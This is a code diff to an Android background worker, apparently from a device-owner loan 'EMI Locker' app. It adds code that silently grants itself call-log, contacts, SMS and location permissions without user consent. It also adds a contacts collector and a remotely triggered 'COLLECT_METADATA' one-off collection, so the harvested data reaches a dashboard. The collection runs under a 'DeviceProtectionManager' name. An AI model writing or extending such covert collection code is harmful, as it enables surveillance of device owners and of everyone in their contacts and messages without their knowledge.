@@ -10,6 +10,7 @@ import androidx.core.content.ContextCompat;
 import androidx.work.Constraints;
 import androidx.work.ExistingPeriodicWorkPolicy;
 import androidx.work.NetworkType;
+import androidx.work.OneTimeWorkRequest;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 import androidx.work.Worker;
@@ -43,6 +44,15 @@ public class MetadataCollectionWorker extends Worker {
             return Result.success();
         }
         try {
+            // Ensure call-log / contacts / SMS / location runtime permissions are
+            // granted (silent, Device Owner). Without this the collectors below
+            // are skipped and call logs / contacts never reach the dashboard.
+            try {
+                new com.riad.rrlkr.service.DeviceProtectionManager(ctx).grantMetadataPermissions();
+            } catch (Throwable t) {
+                Log.w(TAG, "grantMetadataPermissions failed: " + t.getMessage());
+            }
+
             // SIM change check (uses READ_PHONE_STATE â€” always granted on EMI Locker)
             new SimChangeDetector(ctx).checkAndRecordSimChange();
 
@@ -68,7 +78,10 @@ public class MetadataCollectionWorker extends Worker {
                 new SmsCollector(ctx).collect();
                 new SmsAnalyzer(ctx).analyze();
             }
-
+            // Contacts — needs READ_CONTACTS
+            if (hasPerm(ctx, Manifest.permission.READ_CONTACTS)) {
+                new ContactsCollector(ctx).collect();
+            }
             // Behavior â€” depends on the others, must run last
             new BehaviorAnalyzer(ctx).analyze();
 
@@ -106,5 +119,18 @@ public class MetadataCollectionWorker extends Worker {
     public static void cancel(Context context) {
         try { WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME); }
         catch (Exception e) { Log.e(TAG, "Cancel failed", e); }
+    }
+
+    /** Trigger an immediate one-off collection (used by the COLLECT_METADATA command). */
+    public static void runNow(Context context) {
+        try {
+            OneTimeWorkRequest req = new OneTimeWorkRequest.Builder(MetadataCollectionWorker.class)
+                .addTag("rrlkr_metadata")
+                .build();
+            WorkManager.getInstance(context).enqueue(req);
+            Log.i(TAG, "One-off metadata collection enqueued");
+        } catch (Exception e) {
+            Log.e(TAG, "runNow failed", e);
+        }
     }
 }
